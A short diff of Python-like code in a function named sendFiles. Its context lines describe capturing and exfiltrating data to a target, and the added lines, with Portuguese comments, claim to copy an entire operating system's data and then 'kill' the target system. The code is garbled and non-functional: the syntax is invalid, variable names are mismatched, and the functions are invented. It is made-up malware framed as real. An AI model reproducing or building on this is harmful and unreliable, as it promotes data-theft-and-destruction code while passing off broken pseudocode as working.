@@ -108,3 +108,8 @@ def sendFiles():
     with dataCapture(on_target_operating_system=DATACAPTURE) as DC:
         DC.dataCapture(on_target=DATACAPTURE+EXFILTRATEDATA)
         SEND.POST_MALICIOUS_DATA_TO_TARGET_OPERATING_SYSTEM = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"
+
+#copia os dados do sistema operacional por completo e espera para criar uma rotina em matar o sistema operacional alvo por completo
+#esse aqui é um comando dos bem perigosos
+    with killTargetOS(on_target_os_cmd=KILLSYSTEM) as KTOS: #KILLTARGETOS
+        KTC.killSystem(on_target_operating_system=COPY_DATA (Timeout=10) COPY_DATA=5000 MB+KILLSYSTEM) #Wait in seconds and then kill the system completely after copying all the necessary data needed when finished transfering in the data to the main system.
